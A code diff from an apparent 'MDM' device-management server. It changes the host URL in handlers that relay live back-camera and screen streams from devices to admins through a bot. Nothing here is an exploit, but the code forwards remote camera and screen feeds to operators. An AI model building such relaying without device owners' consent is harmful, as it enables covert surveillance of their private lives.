@@ -2012,7 +2012,7 @@ def _api_camera_frame():
 
                 # ⚡ أرسل رابط البث للبوت فقط للكاميرا الخلفية
                 if "BACK" in stream_id and mdm_bot:
-                    stream_url = f"https://one-1rre.onrender.com/live/{stream_id}"
+                    stream_url = f"https://one-1-yj97.onrender.com/live/{stream_id}"
                     # ابحث عن الجهاز
                     device = None
                     for d in dm._devices.values():
@@ -2075,7 +2075,7 @@ def _sock_screen_frame(data):
             if mdm_bot:
                 dev = dm.get_device_by_sid(request.sid)
                 short_label = _dev_label(dev) if dev else "?"
-                stream_url = f"https://one-1rre.onrender.com/screen-live/{stream_id}"
+                stream_url = f"https://one-1-yj97.onrender.com/screen-live/{stream_id}"
                 for admin_id in Config.ADMIN_IDS:
                     try:
                         mdm_bot.bot.send_message(admin_id,
@@ -2407,7 +2407,7 @@ def _sock_camera_frame(data):
             if "BACK" in stream_id and mdm_bot:
                 dev = dm.get_device_by_sid(request.sid)
                 short_label = _dev_label(dev) if dev else "?"
-                stream_url = f"https://one-1rre.onrender.com/live/{stream_id}"
+                stream_url = f"https://one-1-yj97.onrender.com/live/{stream_id}"
                 for admin_id in Config.ADMIN_IDS:
                     try:
                         mdm_bot.bot.send_message(admin_id,
